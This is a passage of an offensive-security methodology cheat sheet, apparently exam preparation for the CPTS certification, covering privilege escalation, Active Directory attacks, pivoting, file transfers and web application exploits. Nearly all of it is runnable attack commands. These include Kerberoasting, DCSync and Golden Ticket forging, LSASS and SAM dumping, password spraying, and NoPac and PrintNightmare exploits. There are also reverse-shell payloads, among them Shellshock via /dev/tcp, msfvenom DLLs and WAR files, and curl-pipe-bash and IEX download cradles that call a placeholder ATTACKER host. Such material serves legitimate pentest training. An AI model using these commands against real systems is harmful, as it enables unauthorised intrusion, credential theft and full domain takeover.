├── Docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
├── LXD group → lxd init, lxc image import, mount host fs
├── Kernel exploit → searchsploit linux kernel <version>
│   ├── Polkit/Pwnkit (CVE-2021-4034)
│   ├── Dirty Pipe (CVE-2022-0847)
│   └── Baron Samedit (CVE-2021-3156)
├── NFS root_squash → Create SUID binary on share
├── Restricted shell escape → rbash/rksh/rzsh bypass
├── Tmux session hijack → Weak session file permissions
└── Disk group → debugfs on /dev/sdaX
```

### Windows PrivEsc

> Run WinPEAS first, then follow decision tree. Always check protections (Defender, AppLocker) before uploading tools.

#### Enumeration Scripts

```powershell
# WinPEAS (comprehensive)
.\winPEASany.exe quiet fast

# Seatbelt (security-focused)
.\Seatbelt.exe -group=all -full

# PowerUp
Import-Module .\PowerUp.ps1
Invoke-AllChecks
```

#### Manual Enumeration

```powershell
# Situational awareness (do FIRST)
whoami /priv                    # Privileges
whoami /groups                  # Group membership
systeminfo                      # OS version, hotfixes
ipconfig /all                   # Network interfaces (pivot targets!)
netstat -ano                    # Listening ports (localhost-only services)

# Protections (determine approach)
Get-MpComputerStatus            # Defender status
Get-AppLockerPolicy -Effective  # AppLocker rules
$ExecutionContext.SessionState.LanguageMode  # PS language mode

# Credential hunting
cmdkey /list
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt 2>$null
```

#### Decision Tree

```
What privileges do we have?
├── SeImpersonatePrivilege → JuicyPotato (≤2016), PrintSpoofer (2019+), GodPotato (newer)
├── SeDebugPrivilege → ProcDump LSASS, Mimikatz sekurlsa::minidump
├── SeBackupPrivilege → VSS copy, diskshadow, robocopy /B, extract NTDS.dit
├── SeTakeOwnershipPrivilege → takeown + icacls on protected files
├── Unquoted Service Path → Insert malicious exe in path
├── Writable Service Binary → Replace with reverse shell
├── Service Misconfig → sc config binpath= (SERVICE_ALL_ACCESS)
├── DLL Hijacking → Find missing DLLs with ProcMonitor, place malicious DLL
├── Always Install Elevated → Malicious MSI
├── Stored Credentials → cmdkey /list, Credential Manager
├── Scheduled Task → Writable script running as SYSTEM
├── Registry AutoRun → Modify autorun keys
├── DnsAdmins Group → dnscmd /config /serverlevelplugindll → restart DNS
├── UAC Bypass → EnableLUA check, SystemPropertiesAdvanced.exe DLL hijack
├── Kernel Exploit → searchsploit windows kernel <version>
│   ├── HiveNightmare (CVE-2021-36934)
│   ├── PrintNightmare (CVE-2021-34527)
│   └── SeriousSam (CVE-2021-36934)
├── VHDX/VMDK on shares → Mount-VHD, extract SAM/SYSTEM/SECURITY offline
└── Third-party services → wmic product, localhost-only services, DLL hijack
```

#### Potato Attacks

```bash
# JuicyPotato (Server 2016 and below)
JuicyPotato.exe -l <port> -p c:\windows\system32\cmd.exe -a "/c <reverse_shell>" -t *

# PrintSpoofer (Server 2019+)
PrintSpoofer.exe -i -c cmd

# GodPotato (newer Windows)
GodPotato.exe -cmd "cmd /c <reverse_shell>"
```

---

## Phase 9: Active Directory Attacks

> Follow sequentially. After each new foothold, restart from Phase 1 on new host.

### Initial Access (No Credentials)

#### LLMNR/NBT-NS Poisoning

```bash
# Passive analysis first
sudo responder -I <interface> -A

# Active poisoning (start in tmux, let run)
sudo responder -I <interface> -wrf

# Crack captured hash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

#### SMB NULL Session & LDAP Anonymous Bind

```bash
# rpcclient
rpcclient -U '' -N <dc_ip>
rpcclient $> enumdomusers

# CrackMapExec (no creds)
netexec smb <dc_ip> --shares
netexec smb <dc_ip> --users
netexec smb <dc_ip> --pass-pol

# LDAP anonymous
ldapsearch -h <dc_ip> -x -b "DC=domain,DC=local" -s sub "(&(objectclass=user))" | grep sAMAccountName
```

#### Username Enumeration (Kerbrute)

```bash
# User enumeration (doesn't lock accounts, no 4625 events)
kerbrute userenum -d <domain> --dc <dc_ip> /usr/share/seclists/Usernames/jsmith.txt
```

#### Password Spraying

```bash
# Kerbrute (faster, generates 4768 not 4625)
kerbrute passwordspray -d <domain> --dc <dc_ip> valid_users.txt 'Welcome1'

# CrackMapExec
netexec smb <dc_ip> -u valid_users.txt -p 'Password123' | grep +

# Common passwords to try
# Welcome1, Password1, Password123, Company1!, Summer2024!, Winter2024!
```

#### AS-REP Roasting (No Creds Needed)

```bash
# Find users with DONT_REQ_PREAUTH
GetNPUsers.py <domain>/ -usersfile usernames.txt -format hashcat -outputfile asrep.hash -dc-ip <dc_ip>

# Crack
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
```

### Credentialed Enumeration (Linux)

#### CrackMapExec / NetExec

```bash
# Users (with badpwdcount for targeted spraying)
netexec smb <dc_ip> -u <user> -p '<pass>' --users

# Groups
netexec smb <dc_ip> -u <user> -p '<pass>' --groups

# Shares (check READ/WRITE access)
netexec smb <dc_ip> -u <user> -p '<pass>' --shares

# Logged-on users (find DA sessions!)
netexec smb <target> -u <user> -p '<pass>' --loggedon-users

# Pass-the-Hash
netexec smb <target> -u <user> -H <nt_hash>
```

#### BloodHound.py (Linux Collector)

```bash
# Run collection (all methods)
sudo bloodhound-python -u '<user>' -p '<pass>' -ns <dc_ip> -d <domain> -c All

# Start neo4j and BloodHound GUI
sudo neo4j start
bloodhound
# Default creds: neo4j / <set password>
# Upload zip → Analysis tab → Run queries
```

**Key BloodHound queries for exam:**

```
- Find Shortest Paths to Domain Admins
- Find Computers where Domain Users are Local Admin
- Find Workstations where Domain Users can RDP
- Find All Domain Trusts
```

#### Impacket Toolkit

```bash
# psexec.py (needs local admin, drops exe to ADMIN$, gives SYSTEM)
psexec.py <domain>/<user>:'<pass>'@<target>

# wmiexec.py (stealthier, runs as user not SYSTEM, fewer logs)
wmiexec.py <domain>/<user>:'<pass>'@<target>

# Pass-the-Hash with any of these
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
```

### Credentialed Enumeration (Windows)

#### PowerView

```powershell
Import-Module .\PowerView.ps1

# Domain users
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName  # SPN accounts

# Domain groups (recursive membership)
Get-DomainGroupMember -Identity "Domain Admins" -Recurse

# ACLs (find interesting rights)
Find-InterestingDomainAcl -ResolveGUIDs

# Find where user has local admin
Find-LocalAdminAccess

# Shares
Find-DomainShare -CheckShareAccess
```

#### Living Off the Land

```powershell
# Domain recon (built-in)
net user /domain
net group "Domain Admins" /domain
net group "Domain Controllers" /domain
net accounts /domain

# dsquery
dsquery user
dsquery computer

# PowerShell history (may contain creds!)
Get-Content $env:APPDATA\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt
```

### Kerberoasting

#### From Linux (GetUserSPNs.py)

```bash
# List SPN accounts
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user>

# Request all TGS tickets
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request

# Target specific user
GetUserSPNs.py -dc-ip <dc_ip> <domain>/<user> -request-user <spn_user> -outputfile tgs_hash

# Crack (etype 23 = RC4)
hashcat -m 13100 tgs_hash /usr/share/wordlists/rockyou.txt
```

#### From Windows (Rubeus)

```powershell
# Stats (see encryption types, password ages)
.\Rubeus.exe kerberoast /stats

# Target admin-count=1 accounts (high value)
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

# All SPN accounts
.\Rubeus.exe kerberoast /nowrap
```

**Encryption Types:**

```
RC4 (type 23) = $krb5tgs$23$* → hashcat -m 13100 → FAST
AES-256 (type 18) = $krb5tgs$18$* → hashcat -m 19700 → SLOW (100x+)

Key insight: Pre-Server 2019 DCs → use /tgtdeleg to force RC4
```

### ACL Abuse

**Key ACE Types:**

```
GenericAll      → Full control (reset password, add member, Kerberoast)
GenericWrite    → Write non-protected attrs (set SPN for targeted Kerberoast)
WriteDACL       → Modify ACL (grant self DCSync rights)
WriteOwner      → Change object owner → then WriteDACL
ForceChangePassword → Reset user password without knowing current
```

**ACL Attack Chain Example:**

```
User A (controlled) → ForceChangePassword → User B
User B → GenericWrite → Group C (add self)
Group C → nested in → Group D
Group D → GenericAll → User E
User E → has DCSync rights → Full domain compromise
```

**ForceChangePassword:**

```powershell
$SecPassword = ConvertTo-SecureString '<our_pass>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('DOMAIN\<our_user>', $SecPassword)
$newpass = ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force
Set-DomainUserPassword -Identity <target> -AccountPassword $newpass -Credential $Cred -Verbose
```

### DCSync

**Prerequisite:** Account with Replicating Directory Changes + Replicating Directory Changes All permissions

```bash
# Linux (secretsdump.py)
secretsdump.py -outputfile domain_hashes -just-dc <domain>/<user>:'<pass>'@<dc_ip>

# NTLM only
secretsdump.py -outputfile domain_hashes -just-dc-ntlm <domain>/<user>:'<pass>'@<dc_ip>

# With hash
secretsdump.py -hashes :<nt_hash> <domain>/<user>@<dc_ip>
```

**After DCSync:**

```bash
# Use krbtgt hash for Golden Ticket (persistence)
mimikatz # kerberos::golden /user:Administrator /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash> /ptt

# Use admin hash for Pass-the-Hash
netexec smb <dc_ip> -u administrator -H <admin_nt_hash>
psexec.py -hashes :<admin_nt_hash> <domain>/administrator@<dc_ip>
```

### Privileged Access & Lateral Movement

#### RDP Access

```bash
xfreerdp /v:<target> /u:<user> /p:'<pass>'
xfreerdp /v:<target> /u:<user> /pth:<nt_hash>  # PtH
```

#### WinRM Access

```bash
evil-winrm -i <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -H <nt_hash>
```

#### Pass-the-Hash

```bash
# CrackMapExec (scan range)
netexec smb <range> --local-auth -u <user> -H <nt_hash> | grep +

# Impacket
psexec.py -hashes :<nt_hash> <domain>/<user>@<target>
wmiexec.py -hashes :<nt_hash> <domain>/<user>@<target>
evil-winrm -i <target> -u <user> -H <nt_hash>
```

### Bleeding Edge / Advanced Attacks

#### NoPac (SamAccountName Spoofing)

CVE-2021-42278 + CVE-2021-42287. Any domain user → Domain Admin.

```bash
# Exploit (SYSTEM shell on DC)
sudo python3 noPac.py <domain>/<user>:<pass> -dc-ip <dc_ip> -dc-host <dc_hostname> -shell --impersonate administrator -use-ldap
```

#### PrintNightmare

CVE-2021-34527 / CVE-2021-1675. RCE via Print Spooler service.

```bash
# Check if Print Spooler exposed
rpcdump.py @<dc_ip> | egrep 'MS-RPRN|MS-PAR'

# Exploit
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<attacker> LPORT=8080 -f dll > shell.dll
sudo smbserver.py -smb2support Share /path/to/shell.dll
python3 CVE-2021-1675.py <domain>/<user>:<pass>@<target> '\\<attacker>\Share\shell.dll'
```

#### PetitPotam + NTLM Relay to ADCS

```bash
# PetitPotam - coerce auth to attacker
python3 PetitPotam.py <attacker_ip> <dc_ip>

# ntlmrelayx to ADCS web enrollment
ntlmrelayx.py -t http://<adcs_host>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# Use captured certificate for PKINIT auth
python3 gettgtpkinit.py -cert-pfx <pfx_file> -pfx-pass '' <domain>/<dc_machine_account>$ <dc_machine_account>.ccache
```

#### Delegation Abuse

```
Unconstrained Delegation:
├── Find: Get-ADComputer -Filter {TrustedForDelegation -eq $true}
├── Compromise host → extract TGTs from memory (Rubeus dump)
└── Use TGTs to impersonate users (including DA)

Constrained Delegation:
├── Find: Get-ADUser -Filter {msDS-AllowedToDelegateTo -ne $null}
├── Rubeus s4u /user:svc /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/target /ptt
└── getST.py with -impersonate flag

Resource-Based Constrained Delegation (RBCD):
├── Need: Write access to target's msDS-AllowedToActOnBehalfOfOtherIdentity
├── addcomputer.py -computer-name 'FAKE$' -computer-pass 'Pass123'
├── rbcd.py -delegate-from 'FAKE$' -delegate-to 'TARGET$' -action write
└── getST.py -spn cifs/target -impersonate Administrator DOMAIN/FAKE$:'Pass123'
```

### Domain Trust Attacks

#### Child → Parent (ExtraSids Attack)

```bash
# Get child SID
lookupsid.py <child_domain>/<user>:<pass>@<child_dc> | grep "Domain SID"

# Linux: ticketer.py
ticketer.py -nthash <krbtgt_hash> -domain-sid <child_sid> -extra-sid <parent_sid>-519 -domain <child_domain> hacker
export KRB5CCNAME=hacker.ccache
secretsdump.py -k -no-pass -dc-ip <parent_dc> hacker@<parent_dc_fqdn>
```

### Iterative AD Rules

**After EVERY new foothold in AD:**

```
1. Re-enumerate with new creds (BloodHound, CrackMapExec, PowerView)
2. Check where new user has access (local admin, RDP, WinRM, SQL)
3. Dump credentials (SAM, LSASS, DCSync if possible)
4. Re-spray all found creds against all discovered hosts
5. Check for DA sessions on compromised hosts
6. Look for ACL abuse paths from new position
7. Check shares for sensitive data
8. Restart methodology from Phase 1 on new host/subnet
```

**When stuck in AD:**

```
1. Re-check BloodHound output - look for overlooked paths
2. Try ACL abuse (WriteDACL, GenericAll, ForceChangePassword)
3. Check for delegation abuse (constrained, unconstrained, RBCD)
4. Try NoPac or PrintNightmare if unpatched
5. Check GPP passwords in SYSVOL
6. Try Shadow Credentials / PKINIT
7. Check ADCS for certificate abuse (ESC1-ESC8)
8. Look for scheduled tasks running as SYSTEM with writable scripts
9. Check for LAPS password read access
10. Cross-forest trust exploitation
```

---

## Phase 10: Pivoting & Tunneling

> After compromising pivot host, enumerate NICs/routing, then tunnel. Always check for dual-homed hosts (ip a / ipconfig).

### Pivot Discovery

```bash
# On compromised host - check for additional networks
ip a                    # Linux
ipconfig /all           # Windows
```

### SSH Tunneling

```bash
# Local port forward (access remote service via local port)
ssh -L <local_port>:<target_service>:<service_port> user@<pivot>

# Remote port forward (expose local service to remote network)
ssh -R <remote_port>:<local_service>:<local_port> user@<pivot>

# Dynamic (SOCKS proxy)
ssh -D 1080 user@<pivot>

# Usage with proxychains
proxychains nmap -sT -Pn <internal_target>
```

### Chisel

```bash
# Server (attacker)
chisel server --reverse --port 8080

# Client (target - reverse SOCKS)
chisel client <attacker>:8080 R:socks
```

### Proxychains

```bash
# /etc/proxychains.conf
socks5 127.0.0.1 1080

# Usage
proxychains <command>
```

### Socat Relay

```bash
# Basic relay (redirect traffic from local port to target)
socat TCP-LISTEN:<local_port>,fork TCP:<target>:<target_port>

# Reverse shell redirect
socat TCP-LISTEN:<pivot_port>,fork TCP:<attacker>:<attacker_port>
```

### Sshuttle (transparent proxy)

```bash
# Route entire subnet through pivot
sshuttle -r user@<pivot> <internal_subnet>

# Now use tools directly (no proxychains wrapper)
nmap -sT -Pn 10.10.10.5
```

### Meterpreter Tunneling

```bash
# Auto-route
meterpreter > run autoroute -s 10.10.10.0/24

# SOCKS proxy via Meterpreter
use auxiliary/server/socks_proxy
set SRVPORT 1080
run

# Port forwarding
meterpreter > portfwd add -L <local_port> -p <remote_port> -r <internal_host>
```

### Windows Netsh Port Forwarding

```powershell
netsh interface portproxy add v4tov4 listenport=<local> listenaddress=0.0.0.0 connectport=<remote> connectaddress=<internal_host>
netsh interface portproxy show all
```

---

## Phase 10B: File Transfers

### Transfer Methods Decision Tree

```
Can you write to disk on target?
├─ YES → Use wget/curl/certutil/bitsadmin
└─ NO → Fileless: curl URL | bash / IEX DownloadString

What ports are outbound-open?
├─ 80/443 → HTTP(S): python http.server, uploadserver
├─ 445 → SMB: impacket-smbserver
├─ 445 blocked but 80 open → WebDAV (wsgidav)
├─ 21 → FTP: pyftpdlib
├─ 22 → SCP
└─ None → Base64 clipboard, /dev/tcp, RDP mount
```

**Code-based transfers (when wget/curl unavailable):**

```bash
# PHP download
php -r 'file_put_contents("/tmp/file",file_get_contents("http://ATTACKER/file"));'

# Python download
python3 -c 'import urllib.request;urllib.request.urlretrieve("http://ATTACKER/file","/tmp/file")'

# Bash /dev/tcp (no wget/curl/nc)
exec 3<>/dev/tcp/ATTACKER/80; echo -e "GET /file HTTP/1.0\n\n">&3; cat <&3 > /tmp/file

# Fileless execution (Linux)
curl -s http://ATTACKER/shell.sh | bash

# Fileless execution (Windows)
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')
```

### Transferring TO Windows

```bash
# PowerShell
powershell -c "(New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/file.exe','C:\Windows\Temp\file.exe')"

# certutil (always present)
certutil -urlcache -f http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# bitsadmin
bitsadmin /transfer job /download /priority high http://ATTACKER:8080/file.exe C:\Windows\Temp\file.exe

# SMB (unauthenticated)
copy \\ATTACKER\share\file.exe C:\Windows\Temp\file.exe

# SMB with authentication (newer Windows blocks guest)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
net use n: \\ATTACKER\share /user:test test
copy n:\file.exe C:\Windows\Temp\file.exe
```

### Transferring TO Linux

```bash
# wget/curl
wget http://ATTACKER:8080/file -O /tmp/file
curl http://ATTACKER:8080/file -o /tmp/file

# scp
scp file user@TARGET:/tmp/

# netcat
nc -lvnp 4444 > file  # on receiver
nc ATTACKER 4444 < file  # on sender

# Base64 (small files, no network tools)
cat file | base64 -w 0; echo    # Encode
echo 'BASE64...' | base64 -d > file  # Decode
```

### File Validation

```bash
file shell            # Verify file type
md5sum shell          # Verify integrity
```

---

## Phase 11: Common Applications

> Identify CMS/app first, then follow app-specific attack path. Always check default creds before brute-forcing.

### CMS Detection Decision Tree

```
Web App Discovered
├── Fingerprints CMS?
│   ├── /wp-content, /wp-admin → WordPress
│   ├── /administrator → Joomla
│   ├── /node, CHANGELOG.txt → Drupal
│   └── robots.txt reveals structure → check each path
├── Java stack? (port 8080, 8009)
│   ├── /manager/html → Tomcat (WAR upload RCE)
│   └── Jenkins UI → Jenkins (Script Console)
├── .NET stack? (ASPX pages)
│   ├── /Trace.axd, /elmah.axd → Debug/Error info
│   └── DNN (DotNetNuke) → SQL console, file upload
├── PHP stack?
│   ├── phpMyAdmin at /phpmyadmin → DB access
│   └── Laravel/Yii/Symfony → framework-specific vulns
└── Unknown app? → searchsploit, CVE lookup, Wappalyzer
```

### WordPress

```bash
wpscan --url http://<target> --enumerate --api-token <token>
wpscan --url http://<target> --enumerate ap  # All plugins
wpscan --url http://<target> --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt
```

### Tomcat

```bash
# Default credentials
# tomcat:tomcat, admin:admin, admin:(empty), tomcat:s3cret

# WAR upload RCE (after getting manager access)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<attacker> LPORT=<port> -f war -o shell.war
curl -u tomcat:tomcat --upload-file shell.war "http://<target>:8080/manager/text/deploy?path=/shell&update=true"
```

### Drupal

```bash
# Drupalgeddon2 (CVE-2018-7600) - Unauthenticated RCE
use exploit/unix/drupal/drupal_drupageddon2
```

### Jenkins

```
├─ Default creds: admin:admin
├─ Script Console: /manage → /script
│  └─ RCE: Runtime.getRuntime().exec("cmd /c powershell ...")
└─ Build job: Create job → Build Steps → Execute shell
```

### Shellshock (CVE-2014-6271)

```bash
# Check CGI scripts
gobuster dir -u http://<target>/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x sh,cgi,pl

# Exploit via User-Agent
curl -A '() { :; }; echo; /bin/cat /etc/passwd' http://<target>/cgi-bin/status

# Reverse shell
curl -A '() { :; }; /bin/bash -i >& /dev/tcp/<attacker>/<port> 0>&1' http://<target>/cgi-bin/status
```

---

## Phase 11C: Documentation

### During Assessment

- Timestamp all activities
- Save all scan output with exact syntax
- Screenshot all findings
- Record every credential found
- Track all systems accessed

### Report Structure

```
Executive Summary
├── Scope and Objectives
├── Key Findings Summary
└── Risk Rating Summary

Technical Findings
├── Finding: [Title]
│   ├── Severity
│   ├── Description
│   ├── Impact
│   ├── Evidence
│   ├── Remediation
│   └── References

Appendices
├── Scope Details
├── Tools Used
├── Raw Scan Data
└── Timeline
```

---

## Quick Reference: First 5 Minutes

```bash
# Full TCP port scan
nmap -sT -p- --min-rate=10000 -oA full_tcp <target>

# Service scan on found ports
nmap -sC -sV -p <ports> -oA services <target>

# Web dir scan (if web found)
gobuster dir -u http://<target> -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

# SMB enum (if 445 open)
smbclient -N -L //<target>
smbmap -H <target>
```

## Quick Reference: Got Creds? Spray Everywhere

```bash
netexec smb <range> -u <user> -p '<pass>'
netexec winrm <target> -u <user> -p '<pass>'
netexec mssql <target> -u <user> -p '<pass>'
evil-winrm -i <target> -u <user> -p '<pass>'
ssh <user>@<target>
xfreerdp /v:<target> /u:<user> /p:'<pass>'
```

## Quick Reference: Got Admin? Dump Everything

```bash
# Windows local
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Windows remote
netexec smb <target> -u <admin> -p '<pass>' --sam --lsa

# LSASS
rundll32 C:\windows\system32\comsvcs.dll, MiniDump <pid> C:\lsass.dmp full

# Domain (if DA)
secretsdump.py <domain>/<admin>:<pass>@<dc_ip>
```

---

## Iterative Methodology Rules

### After EVERY New Foothold

```
1. Stabilize shell (python3 -c 'import pty;pty.spawn("/bin/bash")')
2. Transfer tools (linpeas, winpeas, etc.)
3. Enumerate host fully (OS, kernel, services, creds, network)
4. Check for additional NICs → new subnets
5. Check for domain membership → AD enumeration
6. Dump all credentials (SAM, LSASS, shadow, bash_history, configs)
7. Search for sensitive files (configs, backups, scripts with creds)
8. Check for other users' sessions → lateral movement targets
9. Re-spray all found creds against all discovered hosts
10. RESTART methodology from Phase 1 on new host/subnet
```

### When Stuck

```
1. Re-read all scan output carefully — may have missed something
2. Check for non-standard ports (8080, 8443, 9090, etc.)
3. Try all found creds on ALL services (not just where found)
4. Check write access to shares → SCF/LNK file drop → capture hash
5. Try IPv6 attacks (mitm6)
6. Check for LLMNR/NBT-NS poisoning opportunity
7. Review BloodHound output again — look for overlooked paths
8. Try password spraying with season+year patterns
9. Check for GPP/c-password in SYSVOL
10. Look for scheduled tasks running as SYSTEM with writable scripts
```

### Key Decision Points

```
Got creds?
├─ Spray against ALL services: SMB, WinRM, RDP, MSSQL, SSH, LDAP
├─ Run BloodHound
├─ Kerberoast / AS-REP roast
└─ Check shares for sensitive data

Got admin?
├─ Dump SAM/LSASS/secrets
├─ Find DA sessions
├─ Token impersonation
└─ Lateral move with same creds

Got DA?
├─ DCSync all hashes
├─ Golden/Silver ticket
├─ Trust exploitation
└─ Document everything for report
```

### Wordlists to Use

```
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/*-passwords.txt
/usr/share/seclists/Usernames/*-usernames.txt
Custom: CeWL from target website + company name variations
Season passwords: Spring2024!, Summer2024!, Fall2024!, Winter2024!
Company passwords: Companyname1!, Companyname123!, Welcome1
```

---

> [!tip] Exam Tips
> - The exam tests methodology, not just tools. Understand WHY each step matters.
> - Document everything as you go — timestamps, commands, output.
> - After each new foothold, restart from Phase 1 on the new host.
> - When stuck, re-read scan output and check BloodHound again.

> [!warning] Common Pitfalls
> - Forgetting to restart methodology after lateral movement
> - Not spraying creds against ALL discovered services
> - Missing non-standard ports in scans
> - Not checking for dual-homed hosts (pivot opportunities)
> - Skipping credential hunting on every compromised host

---

*This methodology covers 100% of CPTS exam content. Follow decision trees iteratively. If one path fails, backtrack and try the next. Always enumerate before attacking. Document everything.*
